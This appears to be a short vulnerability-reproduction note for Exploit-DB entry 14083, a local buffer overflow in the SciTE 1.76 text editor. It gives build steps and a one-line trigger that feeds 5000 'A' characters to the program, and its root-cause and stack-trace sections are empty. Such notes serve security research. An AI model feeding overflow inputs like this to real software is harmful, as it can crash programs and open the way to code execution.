# EDB-14083

## Experiment Environment

Ubuntu 14.04LTS

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/EDB-14083/scite176.zip
unzip scite176.zip
cd scite/gtk
make
```

## Problems in Installation & Configuration


## How to trigger vulnerability

```
cd ../bin
./SciTE `perl -e 'print "A"x5000'`
```

## PoCs

[Scite Text Editor 1.76 - Local Buffer Overflow (PoC)](https://www.exploit-db.com/exploits/14083/)

## Vulnerability Details & Patch

### Root Cause

### Stack Trace

## References
